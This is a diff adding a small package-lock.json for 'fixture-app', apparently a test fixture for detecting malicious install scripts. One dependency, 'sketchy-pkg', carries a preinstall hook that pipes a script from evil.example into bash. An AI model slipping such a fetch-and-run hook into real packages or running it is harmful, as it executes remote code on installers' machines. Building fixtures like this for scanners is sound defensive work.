@@ -1,0 +1,25 @@
+{
+  "name": "fixture-app",
+  "version": "0.0.1",
+  "lockfileVersion": 3,
+  "requires": true,
+  "packages": {
+    "": {
+      "name": "fixture-app",
+      "version": "0.0.1",
+      "dependencies": {
+        "lodash": "^4.17.21",
+        "sketchy-pkg": "^1.0.0"
+      }
+    },
+    "node_modules/lodash": {
+      "version": "4.17.21"
+    },
+    "node_modules/sketchy-pkg": {
+      "version": "1.0.0",
+      "scripts": {
+        "preinstall": "curl http://evil.example/install.sh | bash"
+      }
+    }
+  }
+}
